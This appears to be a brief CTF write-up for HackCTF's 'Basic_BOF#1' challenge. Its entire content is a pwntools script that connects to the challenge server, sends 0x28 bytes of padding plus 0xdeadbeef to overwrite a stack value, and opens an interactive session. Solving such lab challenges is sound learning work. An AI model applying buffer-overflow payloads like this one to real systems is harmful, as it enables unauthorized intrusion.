---
title: "[HackCtf] Basic_BOF#1"
date: 2020-06-29
ctf: HackCTF
tag: [pwnable]
layout: post
---
```
from pwn import *
 
p = remote("ctf.j0n9hyun.xyz", 3000)
 
p.sendline("0"*0x28+p32(0xdeadbeef))
p.interactive()
```
